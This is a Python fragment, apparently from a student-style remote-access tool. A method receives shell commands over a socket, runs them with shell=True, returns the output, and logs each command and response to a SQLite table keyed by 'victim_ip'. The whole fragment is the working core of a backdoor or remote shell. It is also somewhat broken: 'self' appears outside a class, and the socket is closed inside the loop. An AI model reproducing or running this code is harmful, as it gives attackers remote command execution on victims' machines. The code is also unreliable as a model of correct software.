import socket
import subprocess
import sqlite3


def listen_send_and_commit_command(self):

    while True:

        command = self.client_socket.recv(self.HEADER).decode(self.FORMAT)
        print(f"[RECV DEBUG] got command: {command}")

        if command.lower() == self.DISCONNECTED_MESSAGE:
            print("[DISCONNECTED]")
            output = self.DISCONNECTED_MESSAGE

        elif not self.if_command_is_legal(command):
            print("[ILLEGAL COMMAND]")
            output = "[ILLEGAL COMMAND]"

        else:

            print(f"[COMMAND RECEIVED] {command}")

            try:
                output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                output = output_bytes.decode("utf-8", errors="replace")

            except subprocess.CalledProcessError as e:
                output = e.output.decode("utf-8", errors="replace")

            if output == "":
                print("[EMPTY] output is empty")
                output = "[EMPTY] output is empty"

            print(f"[SENDING DEBUG] sending result: {output[:50]}...")

        self.client_socket.sendall(output.encode(self.FORMAT))

        connection = sqlite3.connect("save_commands.db")  # קובץ באותה תיקייה של הקוד
        cursor = connection.cursor()

        cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_ip TEXT,
            command TEXT,
            response TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
        """)

        sql = ("""INSERT INTO commands (victim_ip, command, response)
                  VALUES (?, ?, ?)
                  """)

        values = self.IP, command, output

        cursor.execute(sql, values)
        connection.commit()
        connection.close()

        self.client_socket.close()